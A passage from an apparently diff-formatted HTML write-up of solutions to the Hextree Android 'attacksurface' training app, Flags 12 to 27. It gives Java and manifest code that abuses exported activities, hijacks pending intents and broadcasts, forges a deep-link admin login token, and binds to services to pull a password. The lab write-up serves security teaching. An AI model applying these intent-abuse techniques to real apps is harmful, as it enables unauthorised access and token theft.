+    <span class="na">android:exported=</span><span class="s">"true"</span> <span class="nt">&gt;</span>
+<span class="nt">&lt;intent-filter&gt;</span>
+    <span class="nt">&lt;action</span> <span class="na">android:name=</span><span class="s">"io.hextree.attacksurface.ATTACK_ME"</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;category</span> <span class="na">android:name=</span><span class="s">"android.intent.category.DEFAULT"</span> <span class="nt">/&gt;</span>
+<span class="nt">&lt;/intent-filter&gt;</span>
+<span class="nt">&lt;/activity&gt;</span>
+</pre></table></code></div></div><p>Main Activity</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre><span class="nc">Intent</span> <span class="n">intent2</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">();</span>
+<span class="n">intent2</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">"io.hextree.attacksurface"</span><span class="o">,</span> <span class="s">"io.hextree.attacksurface.activities.Flag12Activity"</span><span class="o">);</span>
+<span class="n">intent2</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"LOGIN"</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
+<span class="n">startActivity</span><span class="o">(</span><span class="n">intent2</span><span class="o">);</span>
+</pre></table></code></div></div><p>SecondActvity</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre><span class="nc">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="n">getIntent</span><span class="o">();</span>
+<span class="k">if</span><span class="o">(</span><span class="s">"io.hextree.attacksurface.ATTACK_ME"</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">intent</span><span class="o">.</span><span class="na">getAction</span><span class="o">())){</span>
+    <span class="n">intent</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"token"</span><span class="o">,</span> <span class="mi">1094795585</span><span class="o">);</span>
+    <span class="n">setResult</span><span class="o">(</span><span class="mi">42</span><span class="o">,</span> <span class="n">intent</span><span class="o">);</span>
+    <span class="n">finish</span><span class="o">();</span>
+    <span class="nc">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="s">"Flag12"</span><span class="o">,</span> <span class="s">"Accessed"</span><span class="o">);</span>
+<span class="o">}</span><span class="k">else</span><span class="o">{</span>
+		<span class="nc">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="s">"Flag12"</span><span class="o">,</span> <span class="s">"Not Received"</span><span class="o">);</span>
+<span class="o">}</span>
+</pre></table></code></div></div><h3 id="flag22"><strong>Flag22</strong></h3><blockquote><p>Receive Pending Intent</p></blockquote><p>Main Activity</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre><span class="nc">Intent</span> <span class="n">targetIntent</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">();</span>
+<span class="n">targetIntent</span><span class="o">.</span><span class="na">setClass</span><span class="o">(</span><span class="k">this</span><span class="o">,</span>  <span class="nc">SecondActivity</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+<span class="nc">PendingIntent</span> <span class="n">pendingIntent</span> <span class="o">=</span> <span class="nc">PendingIntent</span><span class="o">.</span><span class="na">getActivity</span><span class="o">(</span><span class="k">this</span><span class="o">,</span><span class="mi">0</span><span class="o">,</span><span class="n">targetIntent</span><span class="o">,</span> <span class="nc">PendingIntent</span><span class="o">.</span><span class="na">FLAG_UPDATE_CURRENT</span><span class="o">);</span>
+
+<span class="nc">Intent</span> <span class="n">sendIntent</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">();</span>
+<span class="n">sendIntent</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">"io.hextree.attacksurface"</span><span class="o">,</span> <span class="s">"io.hextree.attacksurface.activities.Flag22Activity"</span><span class="o">);</span>
+<span class="n">sendIntent</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"PENDING"</span><span class="o">,</span> <span class="n">pendingIntent</span><span class="o">);</span>
+<span class="n">startActivity</span><span class="o">(</span><span class="n">sendIntent</span><span class="o">);</span>
+</pre></table></code></div></div><p>Second Activity</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre><span class="nc">Intent</span> <span class="n">receivedIntent</span> <span class="o">=</span> <span class="n">getIntent</span><span class="o">();</span>
+<span class="k">if</span> <span class="o">(</span><span class="n">receivedIntent</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+    <span class="nc">String</span> <span class="n">flag</span> <span class="o">=</span> <span class="n">receivedIntent</span><span class="o">.</span><span class="na">getStringExtra</span><span class="o">(</span><span class="s">"flag"</span><span class="o">);</span>
+    <span class="nc">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="s">"Flag22"</span><span class="o">,</span> <span class="n">flag</span><span class="o">);</span>
+<span class="o">}</span><span class="k">else</span><span class="o">{</span>
+    <span class="nc">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="s">"Flag22"</span><span class="o">,</span> <span class="s">"???"</span><span class="o">);</span>
+<span class="o">}</span>
+</pre></table></code></div></div><h3 id="flag23"><strong>Flag23</strong></h3><blockquote><p>Hijack Pending Intent</p></blockquote><div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre><span class="nt">&lt;activity</span>
+  <span class="na">android:name=</span><span class="s">".SecondActivity"</span>
+  <span class="na">android:exported=</span><span class="s">"true"</span> <span class="nt">&gt;</span>
+<span class="nt">&lt;intent-filter&gt;</span>
+  <span class="nt">&lt;action</span> <span class="na">android:name=</span><span class="s">"io.hextree.attacksurface.MUTATE_ME"</span><span class="nt">/&gt;</span>
+  <span class="nt">&lt;category</span> <span class="na">android:name=</span><span class="s">"android.intent.category.DEFAULT"</span> <span class="nt">/&gt;</span>
+<span class="nt">&lt;/intent-filter&gt;</span>
+<span class="nt">&lt;/activity&gt;</span>
+</pre></table></code></div></div><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre><span class="nc">Intent</span> <span class="n">receivedIntent</span> <span class="o">=</span> <span class="n">getIntent</span><span class="o">();</span>
+<span class="nc">PendingIntent</span> <span class="n">pendingIntent</span> <span class="o">=</span> <span class="n">receivedIntent</span><span class="o">.</span><span class="na">getParcelableExtra</span><span class="o">(</span><span class="s">"pending_intent"</span><span class="o">);</span>
+<span class="nc">Intent</span> <span class="n">newIntent</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">();</span>
+<span class="n">newIntent</span><span class="o">.</span><span class="na">setAction</span><span class="o">(</span><span class="s">"io.hextree.attacksurface.GIVE_FLAG"</span><span class="o">);</span>
+<span class="n">newIntent</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"code"</span><span class="o">,</span> <span class="mi">42</span><span class="o">);</span>
+
+<span class="k">try</span> <span class="o">{</span>
+    <span class="n">pendingIntent</span><span class="o">.</span><span class="na">send</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">newIntent</span><span class="o">);</span>
+<span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">PendingIntent</span><span class="o">.</span><span class="na">CanceledException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+    <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+<span class="o">}</span>
+</pre></table></code></div></div><h2 id="deeplinks"><strong>DeepLinks</strong></h2><h3 id="flag13"><strong>Flag13</strong></h3><blockquote><p>create a hex://open/ link</p></blockquote><p>Via the link builder:</p><p><a href="https://ht-api-mocks-lcfc4kr5oa-uc.a.run.app/android-link-builder?href=hex://open?message=Hello+World">https://ht-api-mocks-lcfc4kr5oa-uc.a.run.app/android-link-builder?href=</a></p><p><code class="language-plaintext highlighter-rouge">hex://flag?action=give-me</code></p><h3 id="flag14"><strong>Flag14</strong></h3><blockquote><p>Hijack web login</p></blockquote><div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre><span class="nt">&lt;activity</span>
+<span class="na">android:name=</span><span class="s">".SecondActivity"</span>
+<span class="na">android:exported=</span><span class="s">"true"</span> <span class="nt">&gt;</span>
+<span class="nt">&lt;intent-filter&gt;</span>
+  <span class="nt">&lt;action</span> <span class="na">android:name=</span><span class="s">"android.intent.action.VIEW"</span><span class="nt">/&gt;</span>
+  <span class="nt">&lt;category</span> <span class="na">android:name=</span><span class="s">"android.intent.category.DEFAULT"</span><span class="nt">/&gt;</span>
+  <span class="nt">&lt;category</span> <span class="na">android:name=</span><span class="s">"android.intent.category.BROWSABLE"</span><span class="nt">/&gt;</span>
+<span class="nt">&lt;data</span>
+    <span class="na">android:scheme=</span><span class="s">"hex"</span>
+    <span class="na">android:host=</span><span class="s">"token"</span><span class="nt">/&gt;</span>
+  <span class="nt">&lt;/intent-filter&gt;</span>
+<span class="nt">&lt;/activity&gt;</span>
+</pre></table></code></div></div><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre><td class="rouge-code"><pre><span class="nc">Intent</span> <span class="n">receivedIntent</span> <span class="o">=</span> <span class="n">getIntent</span><span class="o">();</span>
+<span class="k">if</span><span class="o">(</span><span class="n">receivedIntent</span><span class="o">.</span><span class="na">getAction</span><span class="o">()</span> <span class="o">==</span> <span class="s">"android.intent.action.VIEW"</span><span class="o">){</span>
+    <span class="nc">Uri</span> <span class="n">data</span> <span class="o">=</span> <span class="n">receivedIntent</span><span class="o">.</span><span class="na">getData</span><span class="o">();</span>
+    <span class="nc">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="s">"queryParameters"</span><span class="o">,</span> <span class="nc">String</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">data</span><span class="o">));</span>
+    <span class="nc">String</span> <span class="n">authToken</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="na">getQueryParameter</span><span class="o">(</span><span class="s">"authToken"</span><span class="o">);</span>
+    <span class="nc">String</span> <span class="n">authChallenge</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="na">getQueryParameter</span><span class="o">(</span><span class="s">"authChallenge"</span><span class="o">);</span>
+
+    <span class="nc">Intent</span> <span class="n">sendIntent</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">();</span>
+    <span class="n">sendIntent</span><span class="o">.</span><span class="na">setAction</span><span class="o">(</span><span class="s">"android.intent.action.VIEW"</span><span class="o">);</span>
+    <span class="n">sendIntent</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">"io.hextree.attacksurface"</span><span class="o">,</span><span class="s">"io.hextree.attacksurface.activities.Flag14Activity"</span><span class="o">);</span>
+    <span class="n">sendIntent</span><span class="o">.</span><span class="na">setData</span><span class="o">(</span><span class="nc">Uri</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="s">"hex://token?authToken="</span><span class="o">+</span><span class="n">authToken</span><span class="o">+</span><span class="s">"&amp;type=admin&amp;authChallenge="</span><span class="o">+</span><span class="n">authChallenge</span><span class="o">));</span>
+    <span class="n">startActivity</span><span class="o">(</span><span class="n">sendIntent</span><span class="o">);</span>
+<span class="o">}</span>
+</pre></table></code></div></div><h3 id="flag15"><strong>Flag15</strong></h3><blockquote><p>Create a intent://flag15 / link</p></blockquote><p>Via the link builder:</p><p><a href="https://ht-api-mocks-lcfc4kr5oa-uc.a.run.app/android-link-builder?href=hex://open?message=Hello+World">https://ht-api-mocks-lcfc4kr5oa-uc.a.run.app/android-link-builder?href=</a></p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="nl">intent:</span><span class="err">#</span><span class="nc">Intent</span><span class="o">;</span><span class="kn">package</span><span class="err">=</span><span class="nn">io.hextree.attacksurface</span><span class="o">;</span><span class="n">action</span><span class="o">=</span><span class="n">io</span><span class="o">.</span><span class="na">hextree</span><span class="o">.</span><span class="na">action</span><span class="o">.</span><span class="na">GIVE_FLAG</span><span class="o">;</span><span class="no">S</span><span class="o">.</span><span class="na">action</span><span class="o">=</span><span class="n">flag</span><span class="o">;</span><span class="no">S</span><span class="o">.</span><span class="na">open</span><span class="o">=</span><span class="n">flag</span><span class="o">;</span><span class="no">B</span><span class="o">.</span><span class="na">flag</span><span class="o">=</span><span class="kc">true</span><span class="o">;</span><span class="n">end</span><span class="o">;</span>
+</pre></table></code></div></div><h2 id="broadcast-receivers"><strong>Broadcast Receivers</strong></h2><h3 id="flag16"><strong>Flag16</strong></h3><blockquote><p>Basic Exposed Receiver</p></blockquote><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre><span class="nc">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">();</span>
+<span class="n">intent</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">"io.hextree.attacksurface"</span><span class="o">,</span><span class="s">"io.hextree.attacksurface.receivers.Flag16Receiver"</span><span class="o">);</span>
+<span class="n">intent</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"flag"</span><span class="o">,</span><span class="s">"give-flag-16"</span><span class="o">);</span>
+<span class="n">sendBroadcast</span><span class="o">(</span><span class="n">intent</span><span class="o">);</span>
+</pre></table></code></div></div><h3 id="flag17"><strong>Flag17</strong></h3><blockquote><p>Receiver with Response</p></blockquote><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre><span class="nc">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">();</span>
+<span class="n">intent</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"flag"</span><span class="o">,</span><span class="s">"give-flag-17"</span><span class="o">);</span>
+<span class="n">intent</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">"io.hextree.attacksurface"</span><span class="o">,</span><span class="s">"io.hextree.attacksurface.receivers.Flag17Receiver"</span><span class="o">);</span>
+<span class="n">sendOrderedBroadcast</span><span class="o">(</span><span class="n">intent</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
+</pre></table></code></div></div><h3 id="flag18"><strong>Flag18</strong></h3><blockquote><p>Hijack Broadcast Intent</p></blockquote><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre><span class="nc">BroadcastReceiver</span> <span class="n">receiver</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">BroadcastReceiver</span><span class="o">()</span> <span class="o">{</span>
+<span class="nd">@Override</span>
+<span class="c1">// Once a broadcast received with a specific intent</span>
+<span class="kd">public</span> <span class="kt">void</span> <span class="nf">onReceive</span><span class="o">(</span><span class="nc">Context</span> <span class="n">context</span><span class="o">,</span> <span class="nc">Intent</span> <span class="n">intent</span><span class="o">)</span> <span class="o">{</span>
+    <span class="n">setResultCode</span><span class="o">(</span><span class="mi">1</span><span class="o">);</span>
+    <span class="n">setResultData</span><span class="o">(</span><span class="s">"Heey"</span><span class="o">);</span>
+<span class="o">}</span>
+<span class="o">};</span>
+<span class="c1">// Waiting for any broadcast with this intent "io.hextree.broadcast.FREE_FLAG"</span>
+<span class="n">registerReceiver</span><span class="o">(</span><span class="n">receiver</span><span class="o">,</span> <span class="k">new</span> <span class="nc">IntentFilter</span><span class="o">(</span><span class="s">"io.hextree.broadcast.FREE_FLAG"</span><span class="o">));</span>
+</pre></table></code></div></div><h2 id="widgets"><strong>Widgets</strong></h2><h3 id="flag19"><strong>Flag19</strong></h3><blockquote><p>Widget System intents</p></blockquote><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre><span class="nc">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">();</span>
+<span class="n">intent</span><span class="o">.</span><span class="na">setAction</span><span class="o">(</span><span class="s">"APPWIDGET_UPDATE"</span><span class="o">);</span>
+<span class="nc">Bundle</span> <span class="n">bundle</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Bundle</span><span class="o">();</span>
+<span class="n">bundle</span><span class="o">.</span><span class="na">putInt</span><span class="o">(</span><span class="s">"appWidgetMaxHeight"</span><span class="o">,</span> <span class="mi">1094795585</span><span class="o">);</span>
+<span class="n">bundle</span><span class="o">.</span><span class="na">putInt</span><span class="o">(</span><span class="s">"appWidgetMinHeight"</span><span class="o">,</span> <span class="mi">322376503</span><span class="o">);</span>
+<span class="n">intent</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"appWidgetOptions"</span><span class="o">,</span> <span class="n">bundle</span><span class="o">);</span>
+<span class="n">intent</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">"io.hextree.attacksurface"</span><span class="o">,</span><span class="s">"io.hextree.attacksurface.receivers.Flag19Widget"</span><span class="o">);</span>
+<span class="n">sendBroadcast</span><span class="o">(</span><span class="n">intent</span><span class="o">);</span>
+</pre></table></code></div></div><h2 id="notifications"><strong>Notifications</strong></h2><h3 id="flag20"><strong>Flag20</strong></h3><blockquote><p>Notification Button Intents</p></blockquote><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre><span class="nc">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">();</span>
+<span class="n">intent</span><span class="o">.</span><span class="na">setAction</span><span class="o">(</span><span class="s">"io.hextree.broadcast.GET_FLAG"</span><span class="o">);</span>
+<span class="n">intent</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"give-flag"</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
+<span class="n">sendBroadcast</span><span class="o">(</span><span class="n">intent</span><span class="o">);</span>
+</pre></table></code></div></div><h3 id="flag21"><strong>Flag21</strong></h3><blockquote><p>Hijack Notification Button</p></blockquote><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre><span class="nc">BroadcastReceiver</span> <span class="n">receiver</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">BroadcastReceiver</span><span class="o">()</span> <span class="o">{</span>
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onReceive</span><span class="o">(</span><span class="nc">Context</span> <span class="n">context</span><span class="o">,</span> <span class="nc">Intent</span> <span class="n">intent</span><span class="o">)</span> <span class="o">{</span>
+        <span class="nc">String</span> <span class="n">flag</span> <span class="o">=</span> <span class="n">intent</span><span class="o">.</span><span class="na">getStringExtra</span><span class="o">(</span><span class="s">"flag"</span><span class="o">);</span>
+        <span class="nc">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="s">"flag21"</span><span class="o">,</span> <span class="n">flag</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">};</span>
+<span class="n">registerReceiver</span><span class="o">(</span><span class="n">receiver</span><span class="o">,</span> <span class="k">new</span> <span class="nc">IntentFilter</span><span class="o">(</span><span class="s">"io.hextree.broadcast.GIVE_FLAG"</span><span class="o">));</span>
+<span class="o">}</span>
+</pre></table></code></div></div><h2 id="services"><strong>Services</strong></h2><h3 id="flag24"><strong>Flag24</strong></h3><blockquote><p>Basic Service Start</p></blockquote><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre><span class="nc">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">();</span>
+<span class="n">intent</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">"io.hextree.attacksurface"</span><span class="o">,</span> <span class="s">"io.hextree.attacksurface.services.Flag24Service"</span><span class="o">);</span>
+<span class="n">intent</span><span class="o">.</span><span class="na">setAction</span><span class="o">(</span><span class="s">"io.hextree.services.START_FLAG24_SERVICE"</span><span class="o">);</span>
+<span class="n">startService</span><span class="o">(</span><span class="n">intent</span><span class="o">);</span>
+</pre></table></code></div></div><h3 id="flag25"><strong>Flag25</strong></h3><blockquote><p>Service Lifecycle</p></blockquote><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre><span class="nc">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">();</span>
+<span class="n">intent</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">"io.hextree.attacksurface"</span><span class="o">,</span> <span class="s">"io.hextree.attacksurface.services.Flag25Service"</span><span class="o">);</span>
+<span class="c1">// Change a lock number each time</span>
+<span class="n">intent</span><span class="o">.</span><span class="na">setAction</span><span class="o">(</span><span class="s">"io.hextree.services.UNLOCK1"</span><span class="o">);</span>
+<span class="n">startService</span><span class="o">(</span><span class="n">intent</span><span class="o">);</span>
+</pre></table></code></div></div><h2 id="message-handler"><strong>Message Handler</strong></h2><h3 id="flag26"><strong>Flag26</strong></h3><blockquote><p>Basic Message Handler</p></blockquote><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+</pre><td class="rouge-code"><pre><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MainActivity</span> <span class="kd">extends</span> <span class="nc">AppCompatActivity</span> <span class="o">{</span>
+
+<span class="kd">private</span> <span class="kt">boolean</span> <span class="n">isBound</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
+<span class="kd">private</span> <span class="nc">ServiceConnection</span> <span class="n">connection</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ServiceConnection</span><span class="o">()</span> <span class="o">{</span>
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onServiceConnected</span><span class="o">(</span><span class="nc">ComponentName</span> <span class="n">name</span><span class="o">,</span> <span class="nc">IBinder</span> <span class="n">service</span><span class="o">)</span> <span class="o">{</span>
+        <span class="nc">Messenger</span> <span class="n">serviceMessenger</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Messenger</span><span class="o">(</span><span class="n">service</span><span class="o">);</span>
+        <span class="n">isBound</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
+
+        <span class="c1">// Method to send messages to the service</span>
+        <span class="nc">Message</span> <span class="n">msg</span> <span class="o">=</span> <span class="nc">Message</span><span class="o">.</span><span class="na">obtain</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span> <span class="mi">42</span><span class="o">);</span>
+        <span class="k">try</span><span class="o">{</span>
+            <span class="n">serviceMessenger</span><span class="o">.</span><span class="na">send</span><span class="o">(</span><span class="n">msg</span><span class="o">);</span>
+        <span class="o">}</span>
+        <span class="k">catch</span> <span class="o">(</span><span class="nc">RemoteException</span> <span class="n">e</span><span class="o">){</span>
+            <span class="k">throw</span> <span class="k">new</span> <span class="nf">RuntimeException</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onServiceDisconnected</span><span class="o">(</span><span class="nc">ComponentName</span> <span class="n">name</span><span class="o">)</span> <span class="o">{</span>
+    <span class="o">}</span>
+<span class="o">};</span>
+<span class="nd">@Override</span>
+<span class="kd">protected</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="nc">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
+    <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>
+    <span class="n">setContentView</span><span class="o">(</span><span class="no">R</span><span class="o">.</span><span class="na">layout</span><span class="o">.</span><span class="na">activity_main</span><span class="o">);</span>
+
+    <span class="c1">// Bind to the service</span>
+    <span class="nc">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">();</span>
+    <span class="n">intent</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">"io.hextree.attacksurface"</span><span class="o">,</span> <span class="s">"io.hextree.attacksurface.services.Flag26Service"</span><span class="o">);</span>
+    <span class="n">bindService</span><span class="o">(</span><span class="n">intent</span><span class="o">,</span> <span class="n">connection</span><span class="o">,</span> <span class="nc">Context</span><span class="o">.</span><span class="na">BIND_AUTO_CREATE</span><span class="o">);</span>
+<span class="o">}</span>
+<span class="o">}</span>
+</pre></table></code></div></div><h3 id="flag27"><strong>Flag27</strong></h3><blockquote><p>Message Replies</p></blockquote><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+</pre><td class="rouge-code"><pre><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MainActivity</span> <span class="kd">extends</span> <span class="nc">AppCompatActivity</span> <span class="o">{</span>
+<span class="kd">private</span> <span class="kt">boolean</span> <span class="n">isBound</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
+<span class="kd">private</span> <span class="kd">final</span> <span class="nc">Messenger</span> <span class="n">clientMessegener</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Messenger</span><span class="o">(</span><span class="k">new</span> <span class="nc">IncomingHandler</span><span class="o">());</span>
+<span class="kd">private</span> <span class="nc">Messenger</span> <span class="n">serviceMessenger</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+<span class="kd">private</span> <span class="nc">String</span> <span class="n">obtainedPassword</span><span class="o">;</span>
+
+<span class="kd">private</span> <span class="kd">class</span> <span class="nc">IncomingHandler</span> <span class="kd">extends</span> <span class="nc">Handler</span><span class="o">{</span>
+<span class="nc">IncomingHandler</span><span class="o">()</span> <span class="o">{</span><span class="kd">super</span><span class="o">(</span><span class="nc">Looper</span><span class="o">.</span><span class="na">getMainLooper</span><span class="o">());}</span>
+
+  <span class="nd">@Override</span>
+  <span class="kd">public</span> <span class="kt">void</span> <span class="nf">handleMessage</span><span class="o">(</span><span class="nc">Message</span> <span class="n">msg</span><span class="o">){</span>
+      <span class="nc">Bundle</span> <span class="n">reply</span> <span class="o">=</span>  <span class="n">msg</span><span class="o">.</span><span class="na">getData</span><span class="o">();</span>
+      <span class="n">obtainedPassword</span> <span class="o">=</span> <span class="n">reply</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="s">"password"</span><span class="o">);</span>
+      <span class="k">if</span><span class="o">(</span><span class="n">reply</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">obtainedPassword</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+          <span class="nc">Log</span><span class="o">.</span><span class="na">i</span><span class="o">(</span><span class="s">"MessageReply1234"</span><span class="o">,</span> <span class="n">reply</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
